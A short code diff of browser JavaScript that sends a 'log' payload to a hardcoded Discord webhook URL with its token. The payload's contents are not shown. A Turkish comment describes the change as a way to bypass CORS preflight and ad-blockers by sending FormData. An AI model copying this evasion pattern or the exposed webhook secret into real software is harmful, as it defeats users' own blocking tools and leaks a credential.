@@ -681,10 +681,13 @@ document.addEventListener("DOMContentLoaded", () => {
         }]
       };
 
+      // CORS ve AdBlocker Bypass (Preflight'ı atlamak için FormData kullanıyoruz)
+      const formData = new FormData();
+      formData.append('payload_json', JSON.stringify(payload));
+
       fetch("https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+        body: formData
       }).then(res => {
         if (!res.ok) {
           res.text().then(t => alert("⚠️ DİKKAT: Discord API bu log mesajını reddetti! Sebep: " + t));
